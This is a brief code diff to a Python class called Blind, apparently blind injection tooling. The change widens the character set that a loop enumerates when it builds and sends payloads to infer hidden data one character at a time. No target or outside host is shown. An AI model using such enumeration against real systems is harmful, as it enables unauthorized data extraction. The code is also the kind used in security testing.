@@ -53,7 +53,8 @@ class Blind():
 
 		for i in range(1, length + 1):
 			r = False
-			for j in range(92, 123):
+			for j in chain(range(95, 127), range(65, 91), range(48, 58),
+						   range(32, 48), range(58, 65), range(91, 95)):
 				payload = self.make_payload(condition.format(i, chr(j)))
 				r = self.send(payload)
 				if r:
